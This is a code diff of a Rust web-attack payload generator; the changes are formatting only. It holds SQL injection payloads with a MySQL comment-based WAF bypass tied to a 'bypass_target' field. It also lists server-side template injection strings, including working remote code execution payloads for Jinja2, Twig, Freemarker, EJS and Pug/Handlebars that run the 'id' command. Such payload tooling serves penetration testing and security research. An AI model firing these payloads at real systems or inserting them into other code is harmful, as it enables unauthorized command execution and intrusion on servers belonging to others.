@@ -318,10 +318,7 @@ pub fn generate_sqli_payloads(
             "1 AND SLEEP(5)",
             "1; SELECT pg_sleep(5)",
         ],
-        _ => vec![
-            "' OR 1=1--",
-            "1 OR 1=1",
-        ],
+        _ => vec!["' OR 1=1--", "1 OR 1=1"],
     };
 
     for base in &bases {
@@ -364,7 +361,7 @@ pub fn generate_sqli_payloads(
                     vulnerability_class: VulnerabilityClass::SqlInjection,
                     encoding_chain: Vec::new(),
                     evasion_notes: vec![
-                        "MySQL version comment bypass (/*!50000keyword*/)".to_string()
+                        "MySQL version comment bypass (/*!50000keyword*/)".to_string(),
                     ],
                     context,
                     bypass_target: defense.waf_vendor.clone(),
@@ -379,16 +376,56 @@ pub fn generate_sqli_payloads(
 /// Generate SSTI payloads for common template engines.
 pub fn generate_ssti_payloads() -> Vec<ForgedPayload> {
     let templates = vec![
-        ("${{<%[%'\"}}%\\", "polyglot detection probe", PayloadContext::TemplateLiteral),
-        ("{{7*7}}", "Jinja2/Twig arithmetic", PayloadContext::TemplateLiteral),
-        ("${7*7}", "Freemarker/Velocity arithmetic", PayloadContext::TemplateLiteral),
-        ("#{7*7}", "Thymeleaf/Ruby ERB arithmetic", PayloadContext::TemplateLiteral),
-        ("<%= 7*7 %>", "EJS/ERB arithmetic", PayloadContext::TemplateLiteral),
-        ("{{config.__class__.__init__.__globals__['os'].popen('id').read()}}", "Jinja2 RCE", PayloadContext::TemplateLiteral),
-        ("{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}", "Twig RCE", PayloadContext::TemplateLiteral),
-        ("<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}", "Freemarker RCE", PayloadContext::TemplateLiteral),
-        ("<%= process.mainModule.require('child_process').execSync('id') %>", "EJS RCE", PayloadContext::TemplateLiteral),
-        ("{{constructor.constructor('return this.process.mainModule.require(\"child_process\").execSync(\"id\")')()}}", "Pug/Handlebars RCE", PayloadContext::TemplateLiteral),
+        (
+            "${{<%[%'\"}}%\\",
+            "polyglot detection probe",
+            PayloadContext::TemplateLiteral,
+        ),
+        (
+            "{{7*7}}",
+            "Jinja2/Twig arithmetic",
+            PayloadContext::TemplateLiteral,
+        ),
+        (
+            "${7*7}",
+            "Freemarker/Velocity arithmetic",
+            PayloadContext::TemplateLiteral,
+        ),
+        (
+            "#{7*7}",
+            "Thymeleaf/Ruby ERB arithmetic",
+            PayloadContext::TemplateLiteral,
+        ),
+        (
+            "<%= 7*7 %>",
+            "EJS/ERB arithmetic",
+            PayloadContext::TemplateLiteral,
+        ),
+        (
+            "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
+            "Jinja2 RCE",
+            PayloadContext::TemplateLiteral,
+        ),
+        (
+            "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
+            "Twig RCE",
+            PayloadContext::TemplateLiteral,
+        ),
+        (
+            "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
+            "Freemarker RCE",
+            PayloadContext::TemplateLiteral,
+        ),
+        (
+            "<%= process.mainModule.require('child_process').execSync('id') %>",
+            "EJS RCE",
+            PayloadContext::TemplateLiteral,
+        ),
+        (
+            "{{constructor.constructor('return this.process.mainModule.require(\"child_process\").execSync(\"id\")')()}}",
+            "Pug/Handlebars RCE",
+            PayloadContext::TemplateLiteral,
+        ),
     ];
 
     templates
